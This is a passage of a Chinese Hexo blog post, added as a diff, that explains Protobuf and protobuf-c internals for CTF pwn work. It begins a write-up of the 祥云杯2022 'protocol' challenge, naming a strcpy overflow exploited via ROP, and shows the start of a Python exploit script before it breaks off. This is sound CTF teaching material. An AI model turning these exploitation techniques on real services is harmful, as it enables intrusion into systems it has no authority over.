@@ -1,0 +1,731 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="John Doe">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="Protobuf介绍一种数据压缩编码方式,用于通信协议，数据存储等 对于数据结构,根据目标实现将其编译为代码或另一种结构 只需使用 Protobuf 对数据结构进行一次描述，即可利用各种不同语言或从各种不同数据流中对结构化数据读写 Protobuf官方并不支持C语言,需要使用一个第三方库  protobuf-c     https:&#x2F;&#x2F;github.com&#x2F;protobuf-c&#x2F;protobuf-">
+<meta property="og:type" content="article">
+<meta property="og:title" content="protobuf">
+<meta property="og:url" content="http://lekclc.github.io/2024/07/13/protobuf/index.html">
+<meta property="og:site_name" content="ymixz">
+<meta property="og:description" content="Protobuf介绍一种数据压缩编码方式,用于通信协议，数据存储等 对于数据结构,根据目标实现将其编译为代码或另一种结构 只需使用 Protobuf 对数据结构进行一次描述，即可利用各种不同语言或从各种不同数据流中对结构化数据读写 Protobuf官方并不支持C语言,需要使用一个第三方库  protobuf-c     https:&#x2F;&#x2F;github.com&#x2F;protobuf-c&#x2F;protobuf-">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://gitee.com/Lc10Cl/pic/raw/master/img/20240712235513306.png">
+<meta property="og:image" content="https://gitee.com/Lc10Cl/pic/raw/master/img/20240713141643370.png">
+<meta property="og:image" content="https://gitee.com/Lc10Cl/pic/raw/master/img/20240713141805697.png">
+<meta property="article:published_time" content="2024-07-13T09:27:13.000Z">
+<meta property="article:modified_time" content="2024-07-14T02:49:46.561Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="pwn">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://gitee.com/Lc10Cl/pic/raw/master/img/20240712235513306.png">
+  
+  
+  
+  <title>protobuf - ymixz</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"lekclc.github.io","root":"/","version":"1.9.5","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":true}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 5.4.2"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>ymixz</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="protobuf"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2024-07-13 17:27" pubdate>
+          2024年7月13日 下午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          15k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          125 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">protobuf</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="Protobuf"><a href="#Protobuf" class="headerlink" title="Protobuf"></a>Protobuf</h1><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>一种数据压缩编码方式,用于通信协议，数据存储等</p>
+<p>对于数据结构,根据目标实现将其编译为代码或另一种结构</p>
+<p>只需使用 Protobuf 对数据结构进行一次描述，即可利用各种不同语言或从各种不同数据流中对结构化数据读写</p>
+<p>Protobuf官方并不支持C语言,需要使用一个第三方库  protobuf-c    </p>
+<p><a target="_blank" rel="noopener" href="https://github.com/protobuf-c/protobuf-c">https://github.com/protobuf-c/protobuf-c</a></p>
+<h2 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h2><h3 id="pbtk"><a href="#pbtk" class="headerlink" title="pbtk"></a>pbtk</h3><p>可以直接把需要的proto文件编译出来</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">.pbtk<span class="hljs-regexp">/extractors/</span>from_binary.py .<span class="hljs-regexp">/pwn ./</span><br></code></pre></td></tr></table></figure>
+
+<p>可以得到 .proto</p>
+<p>没恢复出来就手动罢</p>
+<h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><p>先利用proto编译出ctf_pb2.py, 在脚本中导入进行使用</p>
+<figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">protoc <span class="hljs-params">--python_out=</span><span class="hljs-string">./</span> <span class="hljs-string">./ctf.proto</span><br></code></pre></td></tr></table></figure>
+
+<h2 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h2><h4 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h4><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs abnf">// demo.proto<br><span class="hljs-attribute">syntax</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;proto3&quot;</span><span class="hljs-comment">;</span><br><br>package tutorial<span class="hljs-comment">;</span><br><br>message Person &#123;<br>  string name <span class="hljs-operator">=</span> <span class="hljs-number">1</span><span class="hljs-comment">;</span><br>  int32 id <span class="hljs-operator">=</span> <span class="hljs-number">2</span><span class="hljs-comment">;</span><br>  string email <span class="hljs-operator">=</span> <span class="hljs-number">3</span><span class="hljs-comment">;</span><br><br>  enum PhoneType &#123;<br>    PHONE_TYPE_UNSPECIFIED <span class="hljs-operator">=</span> <span class="hljs-number">0</span><span class="hljs-comment">;</span><br>    PHONE_TYPE_MOBILE <span class="hljs-operator">=</span> <span class="hljs-number">1</span><span class="hljs-comment">;</span><br>    PHONE_TYPE_HOME <span class="hljs-operator">=</span> <span class="hljs-number">2</span><span class="hljs-comment">;</span><br>    PHONE_TYPE_WORK <span class="hljs-operator">=</span> <span class="hljs-number">3</span><span class="hljs-comment">;</span><br>  &#125;<br><br>  message PhoneNumber &#123;<br>    string number <span class="hljs-operator">=</span> <span class="hljs-number">1</span><span class="hljs-comment">;</span><br>    PhoneType type <span class="hljs-operator">=</span> <span class="hljs-number">2</span><span class="hljs-comment">;</span><br>  &#125;<br><br>  repeated PhoneNumber phones <span class="hljs-operator">=</span> <span class="hljs-number">4</span><span class="hljs-comment">;</span><br>&#125;<br><br>message AddressBook &#123;<br>  repeated Person people <span class="hljs-operator">=</span> <span class="hljs-number">1</span><span class="hljs-comment">;</span><br>&#125;<br></code></pre></td></tr></table></figure>
+
+<h4 id="syntax"><a href="#syntax" class="headerlink" title="syntax"></a>syntax</h4><p>指明protobuf的版本，有proto2和proto3两个版本，默认为proto2</p>
+<h4 id="package"><a href="#package" class="headerlink" title="package"></a>package</h4><p>防止命名空间冲突，简单项目可以省略</p>
+<h4 id="message"><a href="#message" class="headerlink" title="message"></a>message</h4><p>定义消息结构体，类似C语言中的struct</p>
+<h4 id="修饰符"><a href="#修饰符" class="headerlink" title="修饰符"></a>修饰符</h4><ul>
+<li>optional：可以不提供字段值，字段将被初始化为默认值。（Proto3中不允许显示声明，不加修饰符即optional）</li>
+<li>repeated：类似vector，表明该字段为动态数组，可重复任意次。</li>
+<li>required：必须提供字段值。（Proto3不再支持required）</li>
+</ul>
+<h4 id="基本类型"><a href="#基本类型" class="headerlink" title="基本类型"></a>基本类型</h4><ul>
+<li>bool</li>
+<li>in32</li>
+<li>float</li>
+<li>double</li>
+<li>string</li>
+</ul>
+<h2 id="逆向"><a href="#逆向" class="headerlink" title="逆向"></a>逆向</h2><p>利用 protobuf-c 生成 .c 文件,可以看到反序列化函数 unpack</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function">Tutorial__Person * <span class="hljs-title">tutorial__person__unpack</span></span><br><span class="hljs-function">	<span class="hljs-params">(ProtobufCAllocator  *allocator, <span class="hljs-type">size_t</span> len, <span class="hljs-type">const</span> <span class="hljs-type">uint8_t</span> *data)</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-keyword">return</span> (Tutorial__Person *) <span class="hljs-built_in">protobuf_c_message_unpack</span> 		<br>  						(&amp;tutorial__person__descriptor, allocator, len, data);<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-built_in">protobuf_c_message_unpack</span>(<br>	<span class="hljs-type">const</span> ProtobufCMessageDescriptor *descriptor,<br>	ProtobufCAllocator *allocator,<br>	<span class="hljs-type">size_t</span> len,<br>	<span class="hljs-type">const</span> <span class="hljs-type">uint8_t</span> *data);<br></code></pre></td></tr></table></figure>
+
+<p>在protobuf-c/protobuf-c.h中找到了 <code>ProtobufCMessageDescriptor</code>的定义</p>
+<h3 id="ProtobufCMessageDescriptor"><a href="#ProtobufCMessageDescriptor" class="headerlink" title="ProtobufCMessageDescriptor"></a>ProtobufCMessageDescriptor</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">struct</span> <span class="hljs-title class_">ProtobufCMessageDescriptor</span> &#123;<br>	<span class="hljs-comment">/** Magic value checked to ensure that the API is used correctly. */</span><br>	<span class="hljs-type">uint32_t</span>			magic;<br><br>	<span class="hljs-comment">/** The qualified name (e.g., &quot;namespace.Type&quot;). */</span><br>	<span class="hljs-type">const</span> <span class="hljs-type">char</span>			*name;<br>	<span class="hljs-comment">/** The unqualified name as given in the .proto file (e.g., &quot;Type&quot;). */</span><br>	<span class="hljs-type">const</span> <span class="hljs-type">char</span>			*short_name;<br>	<span class="hljs-comment">/** Identifier used in generated C code. */</span><br>	<span class="hljs-type">const</span> <span class="hljs-type">char</span>			*c_name;<br>	<span class="hljs-comment">/** The dot-separated namespace. */</span><br>	<span class="hljs-type">const</span> <span class="hljs-type">char</span>			*package_name;<br><br>	<span class="hljs-comment">/**</span><br><span class="hljs-comment">	 * Size in bytes of the C structure representing an instance of this</span><br><span class="hljs-comment">	 * type of message.</span><br><span class="hljs-comment">	 */</span><br>	<span class="hljs-type">size_t</span>				sizeof_message;<br><br>	<span class="hljs-comment">/** Number of elements in `fields`. */</span><br>	<span class="hljs-type">unsigned</span>			n_fields;<br>	<span class="hljs-comment">/** Field descriptors, sorted by tag number. */</span><br>	<span class="hljs-type">const</span> ProtobufCFieldDescriptor	*fields;<br>	<span class="hljs-comment">/** Used for looking up fields by name. */</span><br>	<span class="hljs-type">const</span> <span class="hljs-type">unsigned</span>			*fields_sorted_by_name;<br><br>	<span class="hljs-comment">/** Number of elements in `field_ranges`. */</span><br>	<span class="hljs-type">unsigned</span>			n_field_ranges;<br>	<span class="hljs-comment">/** Used for looking up fields by id. */</span><br>	<span class="hljs-type">const</span> ProtobufCIntRange		*field_ranges;<br><br>	<span class="hljs-comment">/** Message initialisation function. */</span><br>	ProtobufCMessageInit		message_init;<br><br>	<span class="hljs-comment">/** Reserved for future use. */</span><br>	<span class="hljs-type">void</span>				*reserved1;<br>	<span class="hljs-comment">/** Reserved for future use. */</span><br>	<span class="hljs-type">void</span>				*reserved2;<br>	<span class="hljs-comment">/** Reserved for future use. */</span><br>	<span class="hljs-type">void</span>				*reserved3;<br>&#125;;<br></code></pre></td></tr></table></figure>
+
+<p>需要关注的有</p>
+<ul>
+<li>magic：通常为0x28AAEEF9。</li>
+<li>n_fields：结构体中的字段数量。</li>
+<li>fields：指向一个储存字段和数据的结构体。</li>
+</ul>
+<p>fields是<code>ProtobufCFieldDescriptor</code>类型</p>
+<h3 id="ProtobufCFieldDescriptor"><a href="#ProtobufCFieldDescriptor" class="headerlink" title="ProtobufCFieldDescriptor"></a>ProtobufCFieldDescriptor</h3><p>定义为</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">struct</span> <span class="hljs-title class_">ProtobufCFieldDescriptor</span> &#123;<br>	<span class="hljs-comment">/** Name of the field as given in the .proto file. */</span><br>	<span class="hljs-type">const</span> <span class="hljs-type">char</span>		*name;<br><br>	<span class="hljs-comment">/** Tag value of the field as given in the .proto file. */</span><br>	<span class="hljs-type">uint32_t</span>		id;<br><br>	<span class="hljs-comment">/** Whether the field is `REQUIRED`, `OPTIONAL`, or `REPEATED`. */</span><br>	ProtobufCLabel		label;<br><br>	<span class="hljs-comment">/** The type of the field. */</span><br>	ProtobufCType		type;<br><br>	<span class="hljs-comment">/**</span><br><span class="hljs-comment">	 * The offset in bytes of the message&#x27;s C structure&#x27;s quantifier field</span><br><span class="hljs-comment">	 * (the `has_MEMBER` field for optional members or the `n_MEMBER` field</span><br><span class="hljs-comment">	 * for repeated members or the case enum for oneofs).</span><br><span class="hljs-comment">	 */</span><br>	<span class="hljs-type">unsigned</span>		quantifier_offset;<br><br>	<span class="hljs-comment">/**</span><br><span class="hljs-comment">	 * The offset in bytes into the message&#x27;s C structure for the member</span><br><span class="hljs-comment">	 * itself.</span><br><span class="hljs-comment">	 */</span><br>	<span class="hljs-type">unsigned</span>		offset;<br><br>	<span class="hljs-comment">/**</span><br><span class="hljs-comment">	 * A type-specific descriptor.</span><br><span class="hljs-comment">	 *</span><br><span class="hljs-comment">	 * If `type` is `PROTOBUF_C_TYPE_ENUM`, then `descriptor` points to the</span><br><span class="hljs-comment">	 * corresponding `ProtobufCEnumDescriptor`.</span><br><span class="hljs-comment">	 *</span><br><span class="hljs-comment">	 * If `type` is `PROTOBUF_C_TYPE_MESSAGE`, then `descriptor` points to</span><br><span class="hljs-comment">	 * the corresponding `ProtobufCMessageDescriptor`.</span><br><span class="hljs-comment">	 *</span><br><span class="hljs-comment">	 * Otherwise this field is NULL.</span><br><span class="hljs-comment">	 */</span><br>	<span class="hljs-type">const</span> <span class="hljs-type">void</span>		*descriptor; <span class="hljs-comment">/* for MESSAGE and ENUM types */</span><br><br>	<span class="hljs-comment">/** The default value for this field, if defined. May be NULL. */</span><br>	<span class="hljs-type">const</span> <span class="hljs-type">void</span>		*default_value;<br><br>	<span class="hljs-comment">/**</span><br><span class="hljs-comment">	 * A flag word. Zero or more of the bits defined in the</span><br><span class="hljs-comment">	 * `ProtobufCFieldFlag` enum may be set.</span><br><span class="hljs-comment">	 */</span><br>	<span class="hljs-type">uint32_t</span>		flags;<br><br>	<span class="hljs-comment">/** Reserved for future use. */</span><br>	<span class="hljs-type">unsigned</span>		reserved_flags;<br>	<span class="hljs-comment">/** Reserved for future use. */</span><br>	<span class="hljs-type">void</span>			*reserved2;<br>	<span class="hljs-comment">/** Reserved for future use. */</span><br>	<span class="hljs-type">void</span>			*reserved3;<br>&#125;;<br></code></pre></td></tr></table></figure>
+
+<p>需要关注的有</p>
+<ul>
+<li>name：字段名。</li>
+<li>id：唯一字段编号。</li>
+<li>label：修饰符，如：required、optional、repeated</li>
+<li>type：数据类型，如：bool、int32、float、double</li>
+</ul>
+<h3 id="类型表"><a href="#类型表" class="headerlink" title="类型表"></a>类型表</h3><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey">typedef enum &#123;<br><span class="hljs-built_in">	PROTOBUF_C_TYPE_INT32,</span>      <span class="hljs-comment">/**&lt; int32 */</span><br><span class="hljs-built_in">	PROTOBUF_C_TYPE_SINT32,</span>     <span class="hljs-comment">/**&lt; signed int32 */</span><br><span class="hljs-built_in">	PROTOBUF_C_TYPE_SFIXED32,</span>   <span class="hljs-comment">/**&lt; signed int32 (4 bytes) */</span><br><span class="hljs-built_in">	PROTOBUF_C_TYPE_INT64,</span>      <span class="hljs-comment">/**&lt; int64 */</span><br><span class="hljs-built_in">	PROTOBUF_C_TYPE_SINT64,</span>     <span class="hljs-comment">/**&lt; signed int64 */</span><br><span class="hljs-built_in">	PROTOBUF_C_TYPE_SFIXED64,</span>   <span class="hljs-comment">/**&lt; signed int64 (8 bytes) */</span><br><span class="hljs-built_in">	PROTOBUF_C_TYPE_UINT32,</span>     <span class="hljs-comment">/**&lt; unsigned int32 */</span><br><span class="hljs-built_in">	PROTOBUF_C_TYPE_FIXED32,</span>    <span class="hljs-comment">/**&lt; unsigned int32 (4 bytes) */</span><br><span class="hljs-built_in">	PROTOBUF_C_TYPE_UINT64,</span>     <span class="hljs-comment">/**&lt; unsigned int64 */</span><br><span class="hljs-built_in">	PROTOBUF_C_TYPE_FIXED64,</span>    <span class="hljs-comment">/**&lt; unsigned int64 (8 bytes) */</span><br><span class="hljs-built_in">	PROTOBUF_C_TYPE_FLOAT,</span>      <span class="hljs-comment">/**&lt; float */</span><br><span class="hljs-built_in">	PROTOBUF_C_TYPE_DOUBLE,</span>     <span class="hljs-comment">/**&lt; double */</span><br><span class="hljs-built_in">	PROTOBUF_C_TYPE_BOOL,</span>       <span class="hljs-comment">/**&lt; boolean */</span><br><span class="hljs-built_in">	PROTOBUF_C_TYPE_ENUM,</span>       <span class="hljs-comment">/**&lt; enumerated type */</span><br><span class="hljs-built_in">	PROTOBUF_C_TYPE_STRING,</span>     <span class="hljs-comment">/**&lt; UTF-8 or ASCII string */</span><br><span class="hljs-built_in">	PROTOBUF_C_TYPE_BYTES,</span>      <span class="hljs-comment">/**&lt; arbitrary byte sequence */</span><br><span class="hljs-built_in">	PROTOBUF_C_TYPE_MESSAGE,</span>    <span class="hljs-comment">/**&lt; nested message */</span><br>&#125; ProtobufCType<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure>
+
+
+
+<h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><h3 id="祥云杯2022-protocol"><a href="#祥云杯2022-protocol" class="headerlink" title="祥云杯2022 protocol"></a>祥云杯2022 protocol</h3><p>扣光了符号表,不过从字符串表可以看出是protobuf</p>
+<p>利用pbtk进行恢复</p>
+<figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">syntax</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;proto2&quot;</span><span class="hljs-comment">;</span><br><br>package ctf<span class="hljs-comment">;</span><br><br>message pwn &#123;<br>    optional bytes username <span class="hljs-operator">=</span> <span class="hljs-number">1</span><span class="hljs-comment">;</span><br>    optional bytes password <span class="hljs-operator">=</span> <span class="hljs-number">2</span><span class="hljs-comment">;</span><br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>生成ctf_pb2文件</p>
+<figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">protoc <span class="hljs-params">--python_out=</span><span class="hljs-string">./</span> <span class="hljs-string">./ctf.proto</span><br></code></pre></td></tr></table></figure>
+
+<p>在这里还学到了一个小技巧</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">strings -tx pwn | grep <span class="hljs-string">&quot;GCC&quot;</span>	<span class="hljs-regexp">//</span>查看程序编译的环境<br></code></pre></td></tr></table></figure>
+
+
+
+<p>漏洞在于</p>
+<p><img src="https://gitee.com/Lc10Cl/pic/raw/master/img/20240712235513306.png" srcset="/img/loading.gif" lazyload alt="image-20240712235511646"></p>
+<p>strcpy直接存在溢出,但是由于存在截断,多次溢出构造rop</p>
+<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs scss">def <span class="hljs-built_in">send_payload</span>(username = b&#x27;admin&#x27;, password = b&#x27;admin&#x27;):<br>    d = ctf_pb2.<span class="hljs-built_in">pwn</span>()<br>    d.username = username<br>    d.password = password<br>    strs = d.<span class="hljs-built_in">SerializeToString</span>()<br>    <span class="hljs-built_in">print</span>(strs)<br>    <span class="hljs-built_in">sa</span>(b<span class="hljs-string">&#x27;Login: &#x27;</span>,strs)<br># - - - - - - - - - - - - - #<br>def <span class="hljs-built_in">pwn_exp</span>():<br>    